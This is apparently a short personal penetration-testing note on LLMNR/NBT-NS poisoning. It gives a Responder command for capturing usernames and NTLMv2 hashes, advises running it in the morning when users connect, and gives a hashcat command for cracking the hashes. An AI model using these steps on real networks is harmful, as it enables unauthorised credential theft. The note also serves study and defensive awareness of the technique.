### Overview: 
Link Local Multicast Name Resolution, used to identify hosts when DNS fails. 
Previously NBT-NS. 
Key flaw is that the services utilize **a user's username and NTLMv2 password hash** when appropriately responded to. 
Summary: It's basically DNS but you'll get username:hashes. 

![[Pasted image 20230128072420.png]]

Step 1: Run responder
>python Responder.py -I tun0 -rdw
Run it first thing in the morning when everyone is connecting. 

Step 2: An event occurs...
Like someone typed in the wrong network drive, DNS fails, LLMNR enacts and you get a username:hash. 

Step 3: Crack dem hashes
>hashcat -m 5600 hashes.txt rockyou.txt 
Yeah that's it, you basically just MITM the LLMNR then crack hashes. 

